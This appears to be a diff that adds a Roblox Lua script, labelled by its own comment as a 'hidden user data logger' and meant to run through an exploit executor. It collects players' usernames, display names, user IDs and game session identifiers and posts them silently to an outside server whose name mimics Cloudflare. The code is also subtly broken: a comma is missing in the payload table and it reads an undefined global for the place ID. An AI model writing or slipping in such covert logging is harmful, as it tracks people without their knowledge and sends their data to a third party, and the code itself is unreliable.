@@ -1,0 +1,66 @@
+-- hidden user data logger 
+
+if _G.ScriptSendData then
+    return
+end
+_G.ScriptSendData = true
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local LocalPlayer = Players.LocalPlayer
+
+local req = request or http_request or (syn and syn.request)
+
+
+if not req then
+    warn("Your executor does not support HTTP requests.")
+    return
+end
+
+--url
+local SERVER_URL = "https://cloudfare-chat-server.sam00441.workers.dev"
+
+local gameId = game.GameId
+local gameTime = os.time
+local placeId = game.PlaceId
+local jobId = game.JobId
+local GameIdTime = tostring(gameTime()) .. ":" .. tostring(gameId)
+_G.GameIdTime = GameIdTime -- same everywhere 
+_G.gameId = gameId -- same in all servers 
+
+local username = LocalPlayer.Name
+local displayName = LocalPlayer.DisplayName
+local userId = LocalPlayer.UserId
+
+
+-- Data sent to the server
+local payloadObj = {
+    user = username,
+    displayName = displayName,
+    userId = userId,
+    gameId = gameId
+    time = _G.GameIdTime,
+    placeId = _G.PlaceID,
+    jobId = jobId,
+    source = "roblox"
+}
+
+local payload = HttpService:JSONEncode(payloadObj)
+
+--sending 
+local success, response = pcall(function()
+    return req({
+        Url = SERVER_URL .. "/send",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+            ["User-Agent"] = "Roblox/WinInet"
+        },
+        Body = payload
+    })
+end)
+
+if not success then
+    warn("Failed to send data:", response)
+end
